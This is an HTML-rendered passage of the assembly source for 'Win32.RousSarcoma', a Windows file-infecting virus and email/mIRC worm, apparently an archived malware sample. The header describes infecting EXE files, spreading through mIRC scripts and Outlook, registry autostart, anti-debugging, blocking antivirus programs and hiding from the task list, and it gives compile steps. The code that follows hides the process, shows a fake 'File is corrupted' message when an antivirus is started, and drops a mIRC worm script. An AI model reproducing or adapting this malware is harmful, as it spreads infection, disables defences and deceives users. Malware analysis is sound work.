<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Rous.a - RousSarc.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      .--------------------------------.</span><span class="sc0">
</span><span class="sc1">;     |                                  |</span><span class="sc0">
</span><span class="sc1">;     | Win32.RousSarcoma by SnakeByte   |</span><span class="sc0">
</span><span class="sc1">;     |     SnakeByte@kryptocrew.de      |</span><span class="sc0">
</span><span class="sc1">;     |  www.kryptocrew.de/snakebyte     |</span><span class="sc0">
</span><span class="sc1">;     .__________________________________.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus was created by the idea of coding a retro virus, which</span><span class="sc0">
</span><span class="sc1">; is able too fool with some AV's. I was not able to realize all my ideas,</span><span class="sc0">
</span><span class="sc1">; but I think it is some fun. This virus uses some tricks to make disinfection</span><span class="sc0">
</span><span class="sc1">; harder. I came to the idea of making a virus which is able to drop itself to</span><span class="sc0">
</span><span class="sc1">; the original EXE File, when I saw that most AV's do not detect the first</span><span class="sc0">
</span><span class="sc1">; generation of a lot of viruses. Therefore the one part of this virus stays</span><span class="sc0">
</span><span class="sc1">; undetected by heuristics. Generally this virus consits of 2 parts. The EXE File</span><span class="sc0">
</span><span class="sc1">; Part and the one which is executed with an infected file. It "hooks" the execution</span><span class="sc0">
</span><span class="sc1">; of every EXE File and does not execute it if it is an AV. If it is none, it gets</span><span class="sc0">
</span><span class="sc1">; infected and started. Before starting the file it also checks if there is an </span><span class="sc0">
</span><span class="sc1">; mirc.ini in the same path. If there is one, it drops a mirc script worm. In Addition</span><span class="sc0">
</span><span class="sc1">; to this, the virus install itself in the registry to get started every time with ;windows.</span><span class="sc0">
</span><span class="sc1">; It searches the registry for more paths to infect files there. If it can't find more</span><span class="sc0">
</span><span class="sc1">; paths it drops a vbs script to send the worm around via Outlook.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I am not good at writing so here is an overview of what</span><span class="sc0">
</span><span class="sc1">; the virus does :</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Name :             Win32.RousSarcoma</span><span class="sc0">
</span><span class="sc1">;  Type :             PE-Appender by increasing last section</span><span class="sc0">
</span><span class="sc1">;  Worming :          Yes, mIRC Script and VBS Worm</span><span class="sc0">
</span><span class="sc1">;  Operating System : Win32</span><span class="sc0">
</span><span class="sc1">;  Author :           SnakeByte</span><span class="sc0">
</span><span class="sc1">;  Payload :          None, too boring to write one ;)  [ Got some other interesting ;stuff</span><span class="sc0">
</span><span class="sc1">;                         in mind i want to code as soon as possible ]</span><span class="sc0">
</span><span class="sc1">;  Virus Size :       8192 Bytes</span><span class="sc0">
</span><span class="sc1">;  Infection Mark :   A-AV</span><span class="sc0">
</span><span class="sc1">;  Encryption :       None</span><span class="sc0">
</span><span class="sc1">;  Autostart :        RunOnce &amp;amp; exefiles</span><span class="sc0">
</span><span class="sc1">;  Anti-Bait :        Does not infect files &amp;lt; 20000 Bytes</span><span class="sc0">
</span><span class="sc1">;  Anti-Debugging :   Yes, against SoftIce and Int 1h tracing</span><span class="sc0">
</span><span class="sc1">;  Anti-AV :          Yes, does not allow the execution of several AV's</span><span class="sc0">
</span><span class="sc1">;                     disables Win2k File Protection</span><span class="sc0">
</span><span class="sc1">;  Anti-User :        Hides itself in files &amp;amp; several different places,</span><span class="sc0">
</span><span class="sc1">;                     is not shown at ctrl-alt-del list</span><span class="sc0">
</span><span class="sc1">;  Runs at Level :    Ring-3, but still infects every EXE File on executing</span><span class="sc0">
</span><span class="sc1">;  Infects :          10 Files in the current directory,</span><span class="sc0">
</span><span class="sc1">;                     10 Files in every path stored in this registry Key :</span><span class="sc0">
</span><span class="sc1">;                      HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App ;Paths</span><span class="sc0">
</span><span class="sc1">;                     Every EXE File which gets executed</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  How to compile ( TASM 5.0 ) :</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     tasm32 /z /ml /m3 RousSarc,,;</span><span class="sc0">
</span><span class="sc1">;     tlink32 -Tpe -c RousSarc,RousSarc,, import32.lib</span><span class="sc0">
</span><span class="sc1">;     pewrsec RousSarc.EXE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     ( Make sure that the .EXE is uppercases !! )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; At the moment there are just 100 Bytes of Code i could add, with the file staying</span><span class="sc0">
</span><span class="sc1">; at 8192 Bytes. If I would add more, the file would grow to 12 KB. I decided to</span><span class="sc0">
</span><span class="sc1">; keep it small and leave stuff out like encryption or even poly. Maybe it could</span><span class="sc0">
</span><span class="sc1">; be optimized on several parts to make it fit with encryption to a 8 KB file,</span><span class="sc0">
</span><span class="sc1">; but I don't mind at the moment</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Thanks and greetz to :</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Lord Arz :    Did you also finish your EXEFILES "hooking" something ? ;)</span><span class="sc0">
</span><span class="sc1">;  DukeCS :      Heh, when will KC be done ? *fg*</span><span class="sc0">
</span><span class="sc1">;  Matsad :      Sorry, for not coming, but i got no cash and need to see my girlfriend ;:P</span><span class="sc0">
</span><span class="sc1">;  Lethal Mind : Heh, where are you ? ;(</span><span class="sc0">
</span><span class="sc1">;  Ciatrix :     Nice that you carry on !</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; ------------------------[ Let's get ready to rumble ]----------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">

</span><span class="sc2">.586p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">                      </span><span class="sc1">; calculate Jumps</span><span class="sc0">
</span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                  </span><span class="sc1">; Hexadecimal numbers</span><span class="sc0">

                           </span><span class="sc1">; define some API's</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">     </span><span class="sc1">; Host for EXE-Part</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">    </span><span class="sc1">; nessesairy to get all other API's in the EXE-Part</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">  </span><span class="sc1">; cause I don't want DLL not found error's</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">     </span><span class="sc1">; for testing</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
                           </span><span class="sc1">; Some constants</span><span class="sc0">
 </span><span class="sc5">VirusSize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8192d</span><span class="sc0">      </span><span class="sc1">; Lenght of EXE-File</span><span class="sc0">
 </span><span class="sc5">ImageBase</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">    </span><span class="sc1">; Imagebase of our TASM generated EXE-File</span><span class="sc0">

 </span><span class="sc5">CPart1</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">600h</span><span class="sc0">
 </span><span class="sc5">Gap1</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0A00h</span><span class="sc0">

</span><span class="sc1">; ###########################################################################</span><span class="sc0">
</span><span class="sc1">; -------------------[ This is the first part of the virus ]-----------------</span><span class="sc0">
</span><span class="sc1">; ###########################################################################</span><span class="sc0">
</span><span class="sc5">Virus</span><span class="sc4">:</span><span class="sc0">
                           </span><span class="sc1">; Here do we search for EXE-files and put the</span><span class="sc0">
                           </span><span class="sc1">; entire PE-Virus EXE to the end !</span><span class="sc0">
                           </span><span class="sc1">; we search for the needed api's with GetProcAdress</span><span class="sc0">
                           </span><span class="sc1">; and LoadModuleHandle, so we will not get Problems</span><span class="sc0">
                           </span><span class="sc1">; with missing DLL's or API's</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'VA-A'</span><span class="sc0">           </span><span class="sc1">; place a mark in ebp, to identify this part</span><span class="sc0">

 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">KERNEL32</span><span class="sc0">         </span><span class="sc1">; push name of kernel32.dll</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">         </span><span class="sc1">; save Handle</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">K32Handle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; if we failed we stop here</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FirstGenHost</span><span class="sc0">

 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Kernel32Names</span><span class="sc0">    </span><span class="sc1">; get all API's we need from kernel</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">XFindFirstFileA</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">K32Handle</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NumberOfKernel32APIS</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetAPI3</span><span class="sc0">              </span><span class="sc1">; the procedure is needed in both parts</span><span class="sc0">

 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">advname</span><span class="sc0">          </span><span class="sc1">; push name of advapi32.dll</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">         </span><span class="sc1">; save Handle</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ADVHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; if we failed we stop here</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FirstGenHost</span><span class="sc0">

 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AdvapiNames</span><span class="sc0">      </span><span class="sc1">; get all API's we need from kernel</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">XRegOpenKeyExA</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ADVHandle</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NumberOfAdvapiAPIS</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetAPI3</span><span class="sc0">              </span><span class="sc1">; the procedure is needed in both parts</span><span class="sc0">

                           </span><span class="sc1">; Lets hide our Application from the CTRL-ALT-DEL List,</span><span class="sc0">
                           </span><span class="sc1">; to prevent us from being detected by a suspicious user ;)</span><span class="sc0">

                           </span><span class="sc1">; Check if the API is available</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegisterServiceProcess</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NoHide</span><span class="sc0">

                           </span><span class="sc1">; Get ID of our process</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XGetCurrentProcessId</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; We want to run as a service</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; process id</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XRegisterServiceProcess</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">NoHide</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; ---------------------------[ Initialisation ]------------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
                           </span><span class="sc1">; Lets do a check on our commandline params,</span><span class="sc0">
                           </span><span class="sc1">; to see, if we got startet with a filename</span><span class="sc0">
                           </span><span class="sc1">; in it --&amp;gt; exefile method</span><span class="sc0">

 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XGetCommandLineA</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CmdLine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                           </span><span class="sc1">; the start of the commandline is in eax,</span><span class="sc0">
                           </span><span class="sc1">; we will parse it to the .exe part to see</span><span class="sc0">
                           </span><span class="sc1">; if there is anything afterwards</span><span class="sc0">
</span><span class="sc5">CommandReceive1</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'EXE.'</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CommandOK1</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CommandReceive1</span><span class="sc0">


</span><span class="sc5">CommandOK1</span><span class="sc4">:</span><span class="sc0">  
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">               </span><span class="sc1">; eax points directly after the &amp;lt;name&amp;gt;.exe</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; if the Commandline ends here, we do not need</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SetRunOnceKey</span><span class="sc0">          </span><span class="sc1">; to care about this ;)</span><span class="sc0">

 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">               </span><span class="sc1">; skip blanc and "</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; save it</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SaveBlanc</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AVNameCheck</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">AVMessage</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mIRCcheck</span><span class="sc0">


</span><span class="sc5">AVMessage</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; Arg ! Dirty AV found .. :P</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                   </span><span class="sc1">; lets drop a message</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">                  </span><span class="sc1">; Style</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AVMsg</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SetRunOnceKey</span><span class="sc0">

 </span><span class="sc5">AVMsg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"File is corrupted. Can't start program"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">PathEnd</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">mIRCcheck</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; we search for the path</span><span class="sc0">
 </span><span class="sc6">pushad</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PathEnd</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">255d</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SaveBlanc</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XGetFullPathNameA</span><span class="sc4">]</span><span class="sc0">
 
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PathEnd</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mircINI</span><span class="sc0">  </span><span class="sc1">; append the mirc.ini to the path</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9d</span><span class="sc0">
 </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                </span><span class="sc1">; and now we need to check if the mIRC.ini does exist</span><span class="sc0">
                          </span><span class="sc1">; if it does, we found a mirc script to infect *eg*</span><span class="sc0">
                          </span><span class="sc1">; because we infect it bevore mIRC gets loaded, we do not</span><span class="sc0">
                          </span><span class="sc1">; need to fear the mIRC worm protection</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindFirstFileProc</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; we did not found the mirc.ini ;(</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NoMirc</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">   </span><span class="sc1">; Write our entry to the file</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MIRCprot</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MOffset</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MIRCrfiles</span><span class="sc0">    
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XWritePrivateProfileStringA</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PathEnd</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MIRCprot</span><span class="sc0"> </span><span class="sc1">; append the RousSarc.ini to the path</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc0">
 </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                </span><span class="sc1">; and now we need to check if the mIRC.ini does exist</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">                </span><span class="sc1">; normal attribs</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">                  </span><span class="sc1">; create a new file (always)</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">          </span><span class="sc1">; read + write</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NameBuffer</span><span class="sc0">      </span><span class="sc1">; file we create</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCreateFileA</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NoMirc</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; save filehandle</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; write script to file</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndScript</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MIRCscript</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MIRCscript</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">Handle</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XWriteFile</span><span class="sc4">]</span><span class="sc0">


                          </span><span class="sc1">; Handle is still on the stack, so we close the file</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCloseHandle</span><span class="sc4">]</span><span class="sc0">
 
</span><span class="sc5">NoMirc</span><span class="sc4">:</span><span class="sc0">
                          </span><span class="sc1">; close the search handle</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCloseHandle</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">CommandReceive2</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; so we will be able to locate the file and</span><span class="sc0">
